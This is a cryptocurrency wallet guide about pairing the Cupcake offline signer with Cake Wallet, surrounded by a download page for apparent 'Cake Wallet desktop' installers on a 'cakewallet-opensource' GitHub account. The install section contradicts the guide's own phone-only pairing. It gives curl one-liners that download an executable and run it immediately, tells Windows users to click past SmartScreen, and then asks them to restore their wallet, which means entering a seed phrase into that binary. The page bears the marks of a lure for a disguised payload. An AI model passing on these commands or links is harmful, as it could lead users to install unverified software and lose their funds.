![Cake Wallet cupcake pairing guide](assets/cake-wallet-cupcake-pairing-article-banner.png)

# Cupcake Pairing With Cake Wallet for Offline Signing

Turning a spare phone into a signer, and the two scans that make it work.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Install Cupcake on a spare phone, keep that phone offline, then pair it with Cake Wallet by scanning the pairing code. Signing afterwards is a second scan in each direction. Bitcoin, Monero and Litecoin are the long-standing set; Zcash signing is newer and needs a build that includes it.

<!-- ARTICLE-BODY-BEGIN -->

## What Cupcake is
It is a separate app that holds keys on a device with no network connection and signs transactions you build in Cake Wallet. The keys never touch an online machine, which is the point; the QR codes are the only channel between the two phones.

Cupcake runs on iOS and Android and pairs with the mobile app. It does not pair with the macOS or Linux desktop builds, so a desktop-only setup cannot use it.

## Pairing the two phones
On Cake Wallet, start adding a Cupcake-backed wallet and let it show a pairing code. On Cupcake, choose the pairing option and scan that code. The apps then exchange what they need to build and sign transactions through further QR scans.

Keep the Cupcake phone offline throughout. Installing the app is the only step that needs a connection, and it is worth doing before you fund anything so the offline phone never has a reason to go online again.

## Which coins it signs
Bitcoin, Monero and Litecoin are the established set. Zcash signing arrived later and requires a build that includes it, which the desktop release on this page does not, so treat Zcash as a newer addition rather than a baseline expectation.

A coin the app cannot sign is not a pairing failure. The pairing is coin-agnostic; the signing support is not.

## Signing a transaction
Build the transaction in Cake Wallet, choose the Cupcake path, and the app produces a QR to scan with the offline phone. Cupcake displays the details for you to confirm, signs, and shows a QR back, which Cake Wallet scans to broadcast.

Reading the details on the offline screen before confirming is the entire security value. A compromised online phone can propose a different recipient, and only that screen catches it.

## Compared with a hardware device
A hardware wallet is purpose-built and small; Cupcake is a phone you already own, with a screen big enough to read a full address. Both keep keys offline, and Cupcake costs nothing beyond the spare device.

The trade-off is ergonomics and battery rather than security. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-hardware-wallet.md">Hardware wallet support in Cake Wallet</a> covers the device route and its per-platform limits, which differ from Cupcake's phone-only rule.

## If something goes wrong
A QR that will not scan is usually a screen brightness, distance or camera-focus problem, and a cracked screen can make it permanent. Cupcake showing no balance is normal: it holds keys, not a synced wallet.

If the Cupcake phone dies or is lost, the wallet is recoverable from the phrase you wrote down when you created it. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md">Restore a Cake Wallet wallet</a> covers that path, including the seed type Monero paper backups often use.

## Install on both devices
Pairing needs matching behaviour on both sides, so install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">latest Cake Wallet release</a> on the phone that will hold the watch-only side, and the current Cupcake build on the offline one.

If you also want shielded ZEC signed offline, <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-zcash-shielded.md">Zcash shielded addresses</a> explains which build carries that support before you plan around it.

## FAQ
### Which coins does Cupcake support?
Bitcoin, Monero and Litecoin, with Zcash signing on newer builds.
### Which old phones work?
An iOS or Android phone that can still install the app and hold a charge. There is no model list to check.
### Why does Cupcake show no balance?
It is a signer, not a synced wallet. The balance shows in Cake Wallet.
### Why is the QR code not scanning?
Screen brightness, distance and camera focus are the usual causes; a damaged screen can prevent it entirely.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[Zcash shielded addresses](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-zcash-shielded.md) · [hardware wallet support in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-hardware-wallet.md) · [restore a Cake Wallet wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md) · [latest Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
